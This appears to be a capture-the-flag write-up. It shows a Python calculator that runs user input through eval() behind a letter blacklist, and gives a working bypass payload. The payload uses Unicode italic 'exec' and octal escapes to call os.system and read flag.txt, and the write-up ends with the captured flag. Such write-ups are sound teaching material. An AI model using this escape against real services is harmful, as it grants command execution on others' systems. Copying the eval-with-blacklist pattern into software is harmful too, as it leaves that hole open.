## Name: Calculator
#### Author: @awesome10billion
#### Category: pwn
#### Difficulty: medium
#### Description: Here's a calculator I made in Python for a class. Can you break it? 

## Procedure
The chall has the following python script
```
import sys

def simple_calculator():
    print("Welcome to the Simple Calculator!")
    print("Enter a mathematical expression:", end=' ')
    expression = input()
    sys.stdin.close()
    try:
        blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
        for x in expression:
            if x in blacklist:
                print(f"{x} is not allowed!")
                exit()
        result = eval(expression)
        print(f"The result is: {result}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    simple_calculator()
```
What the code does:
* Displays a Welcome Message.
* Prompts the User for a Mathematical Expression.
* Closes Standard Input (sys.stdin.close()) – This is unnecessary and can cause issues.
* Checks for Blacklisted Characters (a-z, A-Z, _).
* If any of these characters are in the input, it prints an error message and exits.
* Evaluates the Expression Using eval(expression).

The script attempts to prevent malicious input by blacklisting letters. However, it doesn’t block unicode and numbers, after read about I have used the following payload with unicode and octal.


```𝘦𝘹𝘦𝘤('\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\143\141\164\40\146\154\141\147\56\164\170\164\47\51')```


<img width="1118" alt="Screenshot 2025-03-05 at 8 07 53 AM" src="https://github.com/user-attachments/assets/90340b3b-2cf9-418a-a5d5-8727a134137d" />


flag ```flag{46816031cb2177d2b9cbffe66a93d415}```
